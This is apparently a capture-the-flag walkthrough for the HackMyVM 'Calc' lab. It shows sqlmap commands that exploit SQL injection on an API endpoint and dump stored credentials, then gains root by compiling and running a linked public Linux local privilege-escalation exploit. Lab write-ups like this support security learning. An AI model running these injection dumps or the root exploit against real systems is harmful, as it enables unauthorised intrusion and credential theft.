# Calc: HackMyVM

Difficulty: Easy

## Enumeration

- Ports Open: 22,80,8080
- Port 80 is running a website that takes in a random number and returns a track or something


## Initial Foothold

- On intercepting the requests in BurpSuite we can see that the requests are being made to `/api/track/<id>`. We can try testing this endpoint for sqli as follows

```bash
sqlmap -u "http://<ip>/api/track/1*"
```

- This endpoint is proven vulnerable to sql injection so let's exfiltrate the relevant data.

```bash
sqlmap -u "http://<ip>/api/track/1*" -D calc_db -T webapp_users --dump --batch
```

- This gives us this:

```
+----+----------------------+----------+
| id | password             | username |
+----+----------------------+----------+
| 1  | JimmyThumb_Calc_2010 | Jimmy    |
+----+----------------------+----------+
```

- We can use these credentials to log in and get the user flag.

## Privilege Escalation

- I cheated a little bit for this one, by using the new [copy-fail exploit](https://github.com/tgies/copy-fail-c) in linux, allowing any unprivileged user to become root.
- In brief, to use this exploit,

1. Clone the exploit repo
2. cd into the repo and run the command `make`
3. Download the generated binaries (there are 2, exploit and exploit-passwd, you should download exploit) onto the target machine.
4. Run the binary on the target machine, which then will drop you into a root shell.

Happy Hacking :)
